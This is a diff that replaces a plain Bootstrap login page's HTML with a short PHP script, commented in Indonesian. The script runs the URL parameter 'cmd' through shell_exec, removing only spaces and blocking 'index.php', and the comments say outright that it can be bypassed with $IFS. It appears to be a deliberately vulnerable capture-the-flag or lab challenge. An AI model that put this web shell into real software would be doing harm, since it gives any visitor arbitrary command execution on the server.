@@ -1,32 +1,33 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login System</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
-</head>
-<body>
-    <nav class="navbar navbar-expand-lg navbar-light bg-light">
-        <a class="navbar-brand" href="/">App</a>
-        <div class="collapse navbar-collapse">
-            <ul class="navbar-nav mr-auto">
-                <li class="nav-item">
-                    <a class="nav-link" href="register.php">Register</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" href="login.php">Login</a>
-                </li>
-            </ul>
-        </div>
-    </nav>
+<?php
+// Fungsi untuk memfilter karakter spasi tapi tetap rentan terhadap $IFS
+function sanitize_input($input) {
+    // Mencegah spasi biasa
+    $input = str_replace(' ', '', $input);
+    
 
-    <div class="container mt-4">
-        <h1>Welcome to the Login System</h1>
-    </div>
+    // Kembalikan input yang sudah disanitasi (tanpa spasi)
+    return $input;
+}
 
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
-</body>
-</html>
+// Periksa apakah parameter 'cmd' diset melalui URL
+if (isset($_GET['cmd'])) {
+    // Dapatkan parameter 'cmd' dari URL
+    $cmd = $_GET['cmd'];
+    
+    // Sanitasi input untuk menghilangkan spasi
+    $cmd = sanitize_input($cmd);
+
+    // if index.php in cmd return wah wah wah ga boleh gitu
+    if (strpos($cmd, 'index.php') !== false) {
+        die('wah wah wah ga boleh gitu');
+    }
+    // Jalankan perintah yang dimasukkan melalui parameter 'cmd' menggunakan shell
+    // Ini masih rentan terhadap obfuscation seperti $IFS untuk menggantikan spasi
+    $output = shell_exec($cmd);
+
+    // Tampilkan output dari perintah
+    echo "<pre>$output</pre>";
+} else {
+    echo "Silakan masukkan perintah dengan parameter 'cmd'.";
+}
+?>
